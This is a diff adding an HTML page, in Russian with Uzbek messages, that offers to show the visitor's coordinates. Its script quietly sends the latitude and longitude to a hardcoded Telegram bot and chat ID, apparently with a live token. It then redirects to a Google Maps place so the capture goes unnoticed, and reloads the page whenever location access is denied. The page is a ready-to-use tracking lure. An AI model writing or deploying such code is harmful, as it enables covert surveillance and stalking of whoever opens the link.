@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Определить местоположение и отправить в Telegram</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: Arial, sans-serif;
+      color: white;
+    }
+
+    .bg {
+      background: url('page.jpg') no-repeat center center fixed;
+      background-size: cover;
+      width: 100%;
+      height: 100%;
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .overlay {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 90%;
+      text-align: center;
+      box-sizing: border-box;
+    }
+
+    h3 {
+      font-size: 1.5em;
+      margin-bottom: 10px;
+    }
+
+    button {
+      padding: 12px 24px;
+      font-size: 1.2em;
+      border: none;
+      border-radius: 8px;
+      background-color: #2196F3;
+      color: white;
+      cursor: pointer;
+      width: 100%;
+      max-width: 300px;
+    }
+
+    #output {
+      margin-top: 15px;
+      font-size: 16px;
+      word-wrap: break-word;
+    }
+  </style>
+</head>
+<body>
+  <div class="bg">
+    <div class="overlay">
+      <h3>Определить ваше местоположение</h3>
+      <button onclick="getLocation()">Показать координаты</button>
+      <p id="output">Нажмите кнопку, чтобы определить местоположение</p>
+    </div>
+  </div>
+
+  <script>
+    const telegramBotToken = "7546917984:AAHBXraaR8OrPBnFcT6ScIM0H5IgPzT-SDA"; // Replace with your bot token
+    const telegramChatId = "7571255508";  // Replace with your chat ID
+    const redirectUrl = "https://www.google.com/maps/place/Beruniy+metro/@41.3263475,69.1937808,17.92z/data=!4m6!3m5!1s0x38ae8b0050b316fb:0xc3887c2649ada001!8m2!3d41.3262054!4d69.1944255!16s%2Fg%2F11vwq1r6ww?entry=ttu&g_ep=EgoyMDI1MDQwNy4wIKXMDSoASAFQAw%3D%3D";
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(success, error);
+      } else {
+        document.getElementById("output").innerText = "Геолокация не поддерживается этим браузером.";
+      }
+    }
+
+    function success(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const message = `📍 Foydalanuvchi joylashuvi:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+
+      // Send location to Telegram
+      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: telegramChatId,
+          text: message
+        })
+      })
+      .then(() => {
+        // After sending to Telegram, redirect to Google Maps
+        window.location.href = redirectUrl;
+      })
+      .catch(err => {
+        console.error("Telegramga yuborishda xatolik:", err);
+        alert("Ma’lumot yuborishda xatolik yuz berdi.");
+      });
+
+      document.getElementById("output").innerText = `Широта: ${latitude.toFixed(6)}\nДолгота: ${longitude.toFixed(6)}`;
+    }
+
+    function error(err) {
+      alert("📵 Joylashuvga ruxsat bermadingiz.\nIltimos, qaytadan urinib ko‘ring.");
+      location.reload(); // Reload the page
+    }
+  </script>
+</body>
+</html>
